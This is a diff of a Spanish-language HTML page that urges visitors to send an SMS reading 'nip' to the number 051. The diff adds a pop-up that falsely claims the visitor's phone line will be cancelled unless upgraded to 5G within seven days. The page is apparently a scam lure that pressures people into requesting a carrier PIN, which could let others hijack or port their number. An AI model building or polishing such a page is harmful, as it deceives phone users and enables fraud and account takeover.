@@ -12,56 +12,54 @@
       justify-content:center;
       height:100vh;
       margin:0;
-      background: linear-gradient(135deg, #ffcccc, #ffe6e6);
+      background: url("fondo.jpg") no-repeat center center fixed;
+      background-size: cover;
     }
     .container {
-      background:#fff;
-      padding:25px;
-      border-radius:15px;
-      box-shadow:0 8px 25px rgba(0,0,0,0.15);
-      text-align:center;
-      width:90%;
-      max-width:350px;
-      animation: fadeIn 0.5s ease-in-out;
+      background: rgba(255, 255, 255, 0.92);
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 5px 25px rgba(0,0,0,0.3);
+      text-align: center;
+      width: 90%;
+      max-width: 350px;
     }
     h1 { 
-      font-size:22px; 
-      margin-bottom:10px; 
-      color:#333;
+      font-size: 22px; 
+      margin-bottom: 10px; 
+      color: #b30000;
     }
     p { 
-      font-size:15px; 
-      color:#555; 
-      margin-bottom:20px; 
+      font-size: 14px; 
+      color: #444; 
+      margin-bottom: 20px; 
     }
     .btn {
-      display:inline-block;
-      padding:14px 22px;
-      background:#d62828;
-      color:#fff;
-      text-decoration:none;
-      font-size:16px;
+      display: inline-block;
+      padding: 12px 20px;
+      background: #ff0000;
+      color: #fff;
+      text-decoration: none;
+      font-size: 16px;
       font-weight: bold;
-      border-radius:8px;
+      border-radius: 8px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.3);
       transition: background 0.3s, transform 0.2s;
-      box-shadow:0 4px 10px rgba(214, 40, 40, 0.4);
     }
-    .btn:hover { 
-      background:#a71d1d; 
+    .btn:hover {
+      background: #cc0000;
       transform: scale(1.05);
     }
     .note {
-      display:none; /* ocultamos el texto del número y mensaje */
+      font-size: 13px;
+      color: #555;
+      margin-top: 12px;
     }
     .warning {
-      color:#b33;
-      font-size:13px;
-      margin-top:8px;
-      display:none;
-    }
-    @keyframes fadeIn {
-      from {opacity:0; transform: translateY(-10px);}
-      to {opacity:1; transform: translateY(0);}
+      color: #b33;
+      font-size: 13px;
+      margin-top: 8px;
+      display: none;
     }
   </style>
 </head>
@@ -70,36 +68,27 @@
     <h1>Enviar NIP por SMS</h1>
     <p>Presiona el botón para abrir tu app de mensajes y enviar el NIP.</p>
 
-    <a id="smsLink" class="btn" href="#">📩 Enviar SMS</a>
+    <!-- Enlace SMS: número 051 y texto "nip" -->
+    <a id="smsLink" class="btn" href="sms:051?body=nip">📩 Enviar SMS</a>
 
     <div id="warning" class="warning">
-      Este enlace funciona solo en teléfonos móviles.
+      Es posible que el enlace no funcione en PC. Usa tu teléfono para enviar el SMS al <strong>051</strong> con el texto <strong>nip</strong>.
     </div>
 
-    <!-- Texto oculto pero presente en el código -->
     <div class="note">Número: <strong>051</strong> | Mensaje: <strong>nip</strong></div>
   </div>
 
   <script>
+    // Mostrar alerta al entrar
+    alert("⚠️ Actualice su línea a 5G antes de 7 días, de lo contrario será dada de baja.");
+
+    // Detectar si es móvil
     function isMobile() {
       return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
     }
-    function isIOS() {
-      return /iPhone|iPad|iPod/i.test(navigator.userAgent);
-    }
-
-    const link = document.getElementById('smsLink');
-
     if (!isMobile()) {
       document.getElementById('warning').style.display = 'block';
-    } else {
-      if (isIOS()) {
-        link.href = "sms:051&body=nip"; // formato para iPhone
-      } else {
-        link.href = "sms:051?body=nip"; // formato para Android
-      }
     }
   </script>
 </body>
 </html>
-
